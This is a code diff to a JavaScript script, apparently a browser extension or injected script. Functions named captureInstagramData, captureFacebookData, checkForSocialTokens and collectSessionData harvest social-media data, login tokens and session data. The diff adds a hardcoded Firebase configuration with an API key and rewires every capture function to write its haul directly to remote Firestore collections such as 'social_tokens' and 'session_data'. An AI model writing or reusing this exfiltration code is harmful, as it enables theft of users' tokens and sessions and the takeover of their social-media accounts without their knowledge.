@@ -1,3 +1,19 @@
+// Firebase configuration
+const firebaseConfig = {
+    apiKey: "AIzaSyAAEYQGHXf7t5VgI9MkXO1RpiCH5w98GPw",
+    authDomain: "laptopms.firebaseapp.com",
+    databaseURL: "https://laptopms-default-rtdb.firebaseio.com",
+    projectId: "laptopms",
+    storageBucket: "laptopms.firebasestorage.app",
+    messagingSenderId: "965071744622",
+    appId: "1:965071744622:web:3411e7ada3d13ef070007f",
+    measurementId: "G-2TCNV6ZRY4"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
 // Global variables for tracking state
 let collectionCycle = 0;
 let lastInstagramData = null;
@@ -119,8 +135,8 @@ async function captureInstagramData() {
                 if (lastInstagramData !== dataKey) {
                     lastInstagramData = dataKey;
                     console.log("📤 [INSTAGRAM] Sending data to Firestore...");
-                    const docId = await sendToFirestore('social_media_data', instaData);
-                    console.log(`✅ [INSTAGRAM] Data sent successfully (ID: ${docId})`);
+                    const docRef = await db.collection('social_media_data').add(instaData);
+                    console.log(`✅ [INSTAGRAM] Data sent successfully (ID: ${docRef.id})`);
                 } else {
                     console.log("🔄 [INSTAGRAM] Duplicate data detected, skipping...");
                 }
@@ -194,8 +210,8 @@ async function captureFacebookData() {
                 if (lastFacebookData !== dataKey) {
                     lastFacebookData = dataKey;
                     console.log("📤 [FACEBOOK] Sending data to Firestore...");
-                    const docId = await sendToFirestore('social_media_data', fbData);
-                    console.log(`✅ [FACEBOOK] Data sent successfully (ID: ${docId})`);
+                    const docRef = await db.collection('social_media_data').add(fbData);
+                    console.log(`✅ [FACEBOOK] Data sent successfully (ID: ${docRef.id})`);
                 } else {
                     console.log("🔄 [FACEBOOK] Duplicate data detected, skipping...");
                 }
@@ -273,8 +289,8 @@ async function captureGenericSocialData() {
             };
             
             console.log("📤 [SOCIAL] Sending data to Firestore...");
-            const docId = await sendToFirestore('social_media_data', socialData);
-            console.log(`✅ [SOCIAL] Data sent successfully (ID: ${docId})`);
+            const docRef = await db.collection('social_media_data').add(socialData);
+            console.log(`✅ [SOCIAL] Data sent successfully (ID: ${docRef.id})`);
         } else {
             console.log("🔍 [SOCIAL] No generic social media data found");
         }
@@ -401,8 +417,8 @@ async function checkForSocialTokens() {
         if (tokenCount > 0) {
             console.log(`💾 [TOKEN] Found ${tokenCount} social media tokens!`);
             console.log("📤 [TOKEN] Sending token data to Firestore...");
-            const docId = await sendToFirestore('social_tokens', tokenData);
-            console.log(`✅ [TOKEN] Token data sent successfully (ID: ${docId})`);
+            const docRef = await db.collection('social_tokens').add(tokenData);
+            console.log(`✅ [TOKEN] Token data sent successfully (ID: ${docRef.id})`);
         } else {
             console.log("🔍 [TOKEN] No social media tokens found");
         }
@@ -474,29 +490,12 @@ async function collectSessionData() {
         
         console.log(`💾 [SESSION] Collected ${itemsCollected} relevant session items`);
         console.log("📤 [SESSION] Sending session data to Firestore...");
-        const docId = await sendToFirestore('session_data', sessionData);
-        console.log(`✅ [SESSION] Session data sent successfully (ID: ${docId})`);
+        const docRef = await db.collection('session_data').add(sessionData);
+        console.log(`✅ [SESSION] Session data sent successfully (ID: ${docRef.id})`);
         
         return Promise.resolve();
     } catch (error) {
         console.error("💥 [SESSION] Error collecting session data:", error);
         return Promise.reject(error);
-    }
-}
-
-async function sendToFirestore(collectionName, data) {
-    try {
-        // Ensure Firestore is initialized
-        if (!window.firestoreDB) {
-            console.error("💥 [FIRESTORE] Firestore not initialized");
-            return null;
-        }
-        
-        // Add document to collection
-        const docRef = await addDoc(collection(collectionName), data);
-        return docRef.id;
-    } catch (error) {
-        console.error(`💥 [FIRESTORE] Error adding document to ${collectionName}:`, error);
-        return null;
     }
 }
